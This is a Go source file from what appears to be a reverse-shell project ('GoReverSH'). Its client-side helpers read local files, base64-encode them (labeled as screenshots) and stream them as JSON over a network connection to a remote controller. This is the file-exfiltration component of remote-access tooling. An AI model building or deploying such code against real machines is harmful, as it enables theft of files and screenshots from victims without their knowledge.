package pkgclient

import (
	"GoReverSH/utils"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
)

func JsonEncodeToConnection(conn net.Conn, output utils.Output) error {
	err := json.NewEncoder(conn).Encode(output)
	if err != nil {
		return err
	}
	return nil
}

//繰り返し読み込む関数。効率いい
func RRead(reader io.Reader) ([]byte, int) {
	var content []byte
	buff := make([]byte, 1024)
	size := 0

	for {
		n, err := reader.Read(buff)
		if err != nil {
			if n == 0 || errors.Is(err, io.EOF) {
				break
			}
			log.Println(err)
			break
		}
		//content + bufの中身を一時的に保存。
		tmp := make([]byte, 0, size+n)
		tmp = append(content[:size], buff[:n]...)
		content = tmp
		size += n
		if n < 1024 {
			break
		}
	}

	return content, size
}

func SendFiles(filenames []string, conn net.Conn) error {
	for _, fname := range filenames {
		//sendfile args fname
		f, err := os.Open(fname)
		if err != nil {
			return err
		}
		defer f.Close()

		fstats, err := f.Stat()
		if err != nil {
			return err
		}

		filePath := strings.Split(fname, "/")
		fileLastname := filePath[len(filePath)-1]

		//var content []byte
		content, _ := RRead(f)

		imageToBase64 := base64.StdEncoding.EncodeToString(content)
		src := filepath.Join("screenshot", fileLastname)
		fileinfo := utils.FileInfo{Name: src, Body: []byte(imageToBase64), Size: fstats.Size()}

		output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}

		err = JsonEncodeToConnection(conn, output)
		if err != nil {
			return err
		}
	}
	return nil
}

func SendFile(filenames []string, conn net.Conn) error {
	for _, fname := range filenames {
		//sendfile args fname
		f, err := os.Open(fname)
		if err != nil {
			return err
		}

		fstats, err := f.Stat()
		if err != nil {
			return err
		}

		filePath := strings.Split(fname, "/")
		fileLastname := filePath[len(filePath)-1]

		var content []byte
		buff := make([]byte, 1024)
		size := 0

		for {
			n, err := f.Read(buff)
			if err != nil {
				if n == 0 || errors.Is(err, io.EOF) {
					break
				}
				log.Println(err)
				break
			}
			//content + bufの中身を一時的に保存。
			tmp := make([]byte, 0, size+n)
			tmp = append(content[:size], buff[:n]...)
			content = tmp
			size += n
			if n < 1024 {
				break
			}
		}

		imageToBase64 := base64.StdEncoding.EncodeToString(content)
		src := filepath.Join("screenshot", fileLastname)
		fileinfo := utils.FileInfo{Name: src, Body: []byte(imageToBase64), Size: fstats.Size()}

		output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}

		err = json.NewEncoder(conn).Encode(output)
		if err != nil {
			break
		}

		f.Close()
	}
	return nil
}
